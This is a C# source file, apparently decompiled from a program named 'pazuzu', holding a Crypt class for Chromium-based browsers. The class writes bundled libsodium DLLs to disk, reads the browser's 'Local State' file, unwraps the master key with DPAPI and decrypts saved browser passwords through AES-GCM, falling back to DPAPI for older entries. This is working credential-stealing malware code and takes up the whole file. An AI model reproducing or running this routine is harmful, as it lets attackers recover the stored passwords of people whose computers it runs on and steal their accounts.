using System;
using System.IO;
using System.Linq;
using System.Text;
using SimpleJSON;
using Sodium;
using pazuzu.Properties;

namespace pazuzu.ChromiumBased;

internal class Crypt
{
	private static void checkDlls()
	{
		if (!File.Exists("libsodium.dll"))
		{
			File.WriteAllBytes("libsodium.dll", Resources.libsodium);
		}
		if (!File.Exists("libsodium-64.dll"))
		{
			File.WriteAllBytes("libsodium-64.dll", Resources.libsodium64);
		}
	}

	public static string decryptChrome(string password, string browser = "")
	{
		if (password.StartsWith("v10") || password.StartsWith("v11"))
		{
			checkDlls();
			string path = "";
			string[] array = new string[3] { "", "\\..", "\\..\\.." };
			foreach (string text in array)
			{
				path = Path.GetDirectoryName(browser) + text + "\\Local State";
				if (File.Exists(path))
				{
					break;
				}
				path = null;
			}
			string aJSON = File.ReadAllText(path);
			aJSON = JSON.Parse(aJSON)["os_crypt"]["encrypted_key"];
			byte[] bytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(aJSON)).Remove(0, 5));
			byte[] array2 = DPAPI.Decrypt(bytes);
			byte[] source = Encoding.Default.GetBytes(password).ToArray();
			try
			{
				byte[] array3 = source.Skip(3).Take(12).ToArray();
				byte[] array4 = source.Skip(15).ToArray();
				return Encoding.Default.GetString(SecretAeadAes.Decrypt(array4, array3, array2, (byte[])null));
			}
			catch
			{
				return "failed (AES-GCM)";
			}
		}
		try
		{
			return Encoding.Default.GetString(DPAPI.Decrypt(Encoding.Default.GetBytes(password)));
		}
		catch
		{
			return "failed (DPAPI)";
		}
	}

	public static string GetUTF8(string text)
	{
		Encoding encoding = Encoding.GetEncoding("UTF-8");
		Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
		byte[] bytes = encoding2.GetBytes(text);
		byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
		return encoding2.GetString(bytes2);
	}
}
